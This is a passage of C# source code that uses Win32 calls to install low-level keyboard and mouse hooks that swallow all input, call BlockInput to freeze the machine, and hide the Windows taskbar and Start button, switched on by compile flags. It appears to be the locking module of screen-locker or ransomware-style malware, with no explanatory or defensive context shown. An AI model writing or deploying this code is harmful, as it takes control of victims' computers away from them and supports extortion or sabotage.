        static extern IntPtr CallNextHookEx(IntPtr h, int code, IntPtr w, IntPtr l);
        [DllImport("user32.dll")]
        static extern int GetMessage(out MSG msg, IntPtr hWnd, uint min, uint max);
        [DllImport("user32.dll")]
        static extern bool TranslateMessage(ref MSG msg);
        [DllImport("user32.dll")]
        static extern IntPtr DispatchMessage(ref MSG msg);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("user32.dll")]
        static extern bool BlockInput(bool block);
        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string cls, string wnd);
        [DllImport("user32.dll")]
        static extern int ShowWindow(IntPtr hWnd, int cmd);

        delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

        static IntPtr _BlockMouse(int code, IntPtr w, IntPtr l)
        {
            return new IntPtr(1);
        }

        static IntPtr _BlockKeyboard(int code, IntPtr w, IntPtr l)
        {
            if (code >= 0) return new IntPtr(1);
            return CallNextHookEx(IntPtr.Zero, code, w, l);
        }

        static void _HideTaskbar()
        {
            try
            {
                IntPtr bar = FindWindow("Shell_TrayWnd", null);
                if (bar != IntPtr.Zero) ShowWindow(bar, 0);
                IntPtr start = FindWindow("Button", null);
                if (start != IntPtr.Zero) ShowWindow(start, 0);
            }
            catch { }
        }

#if LOCK_KEYBOARD
        public static void InstallKeyboardHook()
        {
            _HideTaskbar();
            BlockInput(true);
            var tk = new Thread(_KbLoop);
            tk.IsBackground = false;
            tk.Start();
        }
        static void _KbLoop()
        {
            HookProc cb = new HookProc(_BlockKeyboard);
            SetWindowsHookEx(13, cb, GetModuleHandle(null), 0);
            MSG msg;
            while (GetMessage(out msg, IntPtr.Zero, 0, 0) >= 0)
            { TranslateMessage(ref msg); DispatchMessage(ref msg); }
        }
#endif

#if LOCK_MOUSE
        public static void InstallMouseHook()
        {
#if !LOCK_KEYBOARD
            _HideTaskbar();
            BlockInput(true);
#endif
            var t = new Thread(_MsLoop);
            t.IsBackground = false;
            t.Start();
        }
        static void _MsLoop()
        {
            HookProc cb = new HookProc(_BlockMouse);
            SetWindowsHookEx(14, cb, GetModuleHandle(null), 0);
            MSG msg;
            while (GetMessage(out msg, IntPtr.Zero, 0, 0) >= 0)
            { TranslateMessage(ref msg); DispatchMessage(ref msg); }
        }
#endif
    }
#endif

}
